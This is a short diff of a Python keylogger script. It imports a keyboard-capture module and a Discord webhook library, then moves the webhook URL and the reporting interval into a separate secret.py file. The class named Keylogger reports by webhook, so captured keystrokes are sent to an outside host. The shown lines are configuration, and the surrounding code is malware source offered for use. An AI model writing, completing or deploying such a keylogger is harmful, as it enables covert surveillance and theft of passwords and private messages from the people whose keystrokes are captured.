@@ -2,9 +2,14 @@ import keyboard,os
 from threading import Timer
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
+from secret import SEND_TIME_, WEBHOOK_URL
 
-SEND_REPORT_EVERY = TIME_IN_SECONDS_HERE
-WEBHOOK = "WEBHOOK_URL_HERE"
+# YOU CAN EDITE VARIABLE OF WEBHOOK AND SEND_TIME_ IN secret.py
+SEND_REPORT_EVERY=SEND_TIME_
+WEBHOOK=WEBHOOK_URL
+
+
+
 
 class Keylogger: 
     def __init__(self, interval, report_method="webhook"):
